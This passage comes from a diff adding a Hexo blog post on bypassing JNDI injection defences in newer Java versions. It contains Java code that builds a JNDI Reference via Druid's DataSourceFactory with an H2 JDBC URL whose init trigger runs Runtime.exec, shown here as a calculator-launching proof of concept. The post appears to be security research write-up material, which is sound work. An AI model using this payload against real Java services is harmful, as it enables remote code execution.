class="hljs-string">&quot;root&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10656">原理</a>同dbcp，DruidDataSourceFactory也可以发起数据库连接：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">druid</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>,<span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,JDBC_USER));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,JDBC_PASSWORD));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></li>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1489">https://tttang.com/archive/1489</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JNDI/">#JNDI</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JNDI Attack 高版本bypass</div>
+      <div>http://example.com/2023/06/03/JNDI Attack 高版本bypass/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>springtime</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 3, 2023</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/08/SpringBoot%20Fatjar%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E7%A8%B3%E5%AE%9ARCE/" title="SpringBoot Fatjar从任意文件写到RCE">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SpringBoot Fatjar从任意文件写到RCE</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/02/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" title="Java表达式注入">
+                        <span class="hidden-mobile">Java表达式注入</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
